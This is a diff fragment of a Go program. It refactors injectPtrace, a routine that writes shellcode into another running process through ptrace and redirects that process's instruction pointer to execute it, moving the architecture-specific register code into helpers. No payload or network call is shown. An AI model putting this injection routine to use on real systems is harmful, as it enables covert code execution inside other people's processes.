@@ -526,17 +526,7 @@ func injectPtrace(pid int, shellcode []byte) error {
 	}
 
 	// Read the current instruction pointer
-	var rip uint64
-	switch runtime.GOARCH {
-	case "amd64":
-		rip = oldRegs.Rip
-	case "386":
-		rip = uint64(oldRegs.Eip)
-	case "arm64":
-		rip = oldRegs.Pc
-	default:
-		rip = oldRegs.Rip
-	}
+	rip := ptraceGetIP(&oldRegs)
 
 	// Align to page boundary for the allocation
 	pageSize := os.Getpagesize()
@@ -554,7 +544,7 @@ func injectPtrace(pid int, shellcode []byte) error {
 			val = binary.LittleEndian.Uint64(padded[i : i+8])
 		}
 		addr := allocAddr + uint64(i)
-		_, err = syscall.PtracePokeData(pid, addr, []byte(padded[i:i+8]))
+		_, err = syscall.PtracePokeData(pid, uintptr(addr), []byte(padded[i:i+8]))
 		if err != nil {
 			return fmt.Errorf("ptrace pokedata at 0x%x failed: %w", addr, err)
 		}
@@ -562,16 +552,7 @@ func injectPtrace(pid int, shellcode []byte) error {
 	}
 
 	// Set instruction pointer to shellcode
-	switch runtime.GOARCH {
-	case "amd64":
-		oldRegs.Rip = allocAddr
-	case "386":
-		oldRegs.Eip = uint32(allocAddr)
-	case "arm64":
-		oldRegs.Pc = allocAddr
-	default:
-		oldRegs.Rip = allocAddr
-	}
+	ptraceSetIP(&oldRegs, allocAddr)
 	err = syscall.PtraceSetRegs(pid, &oldRegs)
 	if err != nil {
 		return fmt.Errorf("ptrace setregs failed: %w", err)
